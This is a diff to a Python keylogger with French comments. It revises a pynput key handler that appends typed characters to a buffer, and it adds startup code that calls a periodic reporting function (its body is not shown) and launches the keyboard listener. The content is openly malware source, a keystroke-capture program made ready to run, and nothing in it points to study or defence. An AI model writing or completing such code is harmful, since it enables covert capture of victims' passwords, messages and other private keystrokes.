@@ -71,12 +71,10 @@ def on_press(key):
     """
     global log_buffer
     
-    current_key = None
-    
     try:
         # Tente d'obtenir le caractère (A, b, 1, $, etc.)
-        current_key = key.char
-        log_buffer += current_key
+        char = key.char
+        log_buffer += char
         
     except AttributeError:
         # Gère les touches spéciales
@@ -95,5 +93,15 @@ def on_press(key):
             return # Sort immédiatement après backspace
             
         else:
-            # IGNORER : Toutes les autres touches de contrôle (CTRL, ALT, SHIFT, F1, etc.)
-            return
+            # IGNORER : Toutes les touches de contrôle (CTRL, ALT, SHIFT, F1, F2, etc.)
+            return 
+
+# --- Démarrage ---
+
+# Démarre le minuteur pour l'envoi périodique dans un thread séparé
+report() 
+
+# Crée et lance l'écouteur dans le thread principal
+with pynput.keyboard.Listener(on_press=on_press) as listener:
+    # Le keylogger commence à écouter
+    listener.join()
